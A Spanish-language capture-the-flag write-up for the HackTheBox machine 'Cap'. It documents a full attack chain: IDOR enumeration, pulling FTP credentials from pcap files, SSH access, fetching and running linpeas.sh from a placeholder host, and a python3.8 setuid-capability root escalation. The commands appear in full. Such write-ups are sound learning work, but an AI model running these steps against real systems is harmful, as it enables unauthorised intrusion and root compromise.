@@ -1,0 +1,122 @@
+# Documentación - Máquina Cap (HTB)
+
+## Objetivo
+
+Resolver la máquina obteniendo acceso inicial, escalando privilegios y capturando las flags.
+
+---
+
+## Herramientas utilizadas
+
+* Nmap: para escaneo de puertos y servicios
+* Navegador: para interactuar con la web
+* curl: para probar rutas desde terminal
+* Wireshark: para analizar el archivo .pcap
+* FTP: para validar credenciales
+* SSH: para acceder al sistema
+* linpeas.sh: para buscar formas de escalar privilegios
+* Python3: para explotar capabilities
+* Servidor HTTP con Python: para transferir archivos
+
+---
+
+## Comandos utilizados
+
+### Escaneo inicial
+
+nmap -sV -sC -Pn 10.129.54.196
+
+---
+
+### Enumeración web
+
+curl http://10.129.54.196/data/0
+curl http://10.129.54.196/data/1
+curl http://10.129.54.196/data/2
+
+---
+
+### Transferencia de archivos
+
+python -m http.server 8000
+
+En la máquina víctima:
+wget http://TU_IP:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+---
+
+### Acceso por SSH
+
+ssh nathan@10.129.54.196
+
+---
+
+### Enumeración de privilegios
+
+getcap -r / 2>/dev/null
+
+---
+
+### Escalada de privilegios
+
+/usr/bin/python3.8
+
+Dentro de Python:
+import os
+os.setuid(0)
+os.system("/bin/bash")
+
+---
+
+### Obtener flags
+
+cat /home/nathan/user.txt
+cat /root/root.txt
+
+---
+
+## Desarrollo
+
+Primero se realizó un escaneo con Nmap y se identificaron tres puertos abiertos: FTP, SSH y HTTP.
+
+Luego se accedió al servicio web, donde se encontró un panel que generaba rutas como /data/[id].
+Al modificar el ID manualmente se pudo acceder a información de otros usuarios, lo que indica una vulnerabilidad tipo IDOR.
+
+Desde estas rutas se descargaron archivos .pcap.
+Al analizarlos se encontraron credenciales en texto plano dentro del tráfico FTP.
+
+Estas credenciales se probaron en SSH y funcionaron, permitiendo el acceso como el usuario nathan.
+
+Una vez dentro, se transfirió y ejecutó linpeas.sh para analizar el sistema.
+Esta herramienta permitió identificar configuraciones inseguras relacionadas con permisos.
+
+Se encontró que el binario /usr/bin/python3.8 tenía capabilities que permitían cambiar el UID.
+
+Usando Python se logró obtener una shell como root y acceder a la flag final.
+
+---
+
+## Lo que aprendí
+
+* Cómo hacer reconocimiento con Nmap
+* Cómo identificar rutas vulnerables en aplicaciones web
+* Qué es una vulnerabilidad IDOR y cómo explotarla
+* Cómo analizar archivos .pcap para encontrar información sensible
+* Riesgos de usar FTP sin cifrado
+* Importancia de no reutilizar contraseñas
+* Cómo usar linpeas.sh para enumerar el sistema y detectar fallos de seguridad
+* Qué son las capabilities en Linux y cómo pueden explotarse
+* Flujo completo de ataque: reconocimiento, enumeración, explotación y escalada
+
+---
+
+## Conclusión
+
+La máquina muestra cómo una vulnerabilidad web simple puede terminar comprometiendo todo el sistema.
+
+Todo el ataque se basa en pequeños errores: mala validación en la web, exposición de tráfico sensible y mala configuración en el sistema.
+
+---
+
